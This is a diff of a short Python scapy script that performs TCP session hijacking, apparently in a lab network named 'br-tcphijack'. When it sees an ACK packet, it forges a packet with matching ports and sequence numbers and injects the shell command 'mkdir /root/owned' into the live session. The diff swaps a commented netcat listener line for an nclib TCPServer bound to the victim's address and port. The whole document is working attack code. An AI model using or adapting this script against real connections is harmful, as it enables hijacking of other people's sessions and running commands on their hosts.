@@ -1,5 +1,6 @@
 import sys
 from scapy.all import *
+from nclib import TCPServer
 
 def pkt_handler(pkt):
         if pkt[TCP].flags == "A":
@@ -7,7 +8,11 @@ def pkt_handler(pkt):
                 tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=pkt[TCP].flags)
                 raw = Raw(load="mkdir /root/owned \r\n")
                 send(ip/tcp/raw, iface="br-tcphijack", verbose=0)
-                # nc -l -p pkt[TCP].dport -s pkt[IP].dst
+
+                listener = TCPServer((pkt[IP].dst, pkt[TCP].dport))
+                for address in listener:
+                     print(address.recv())
+                     address.send(address.recv())
 
 if __name__ == "__main__":
         src_addr = str(sys.argv[1])
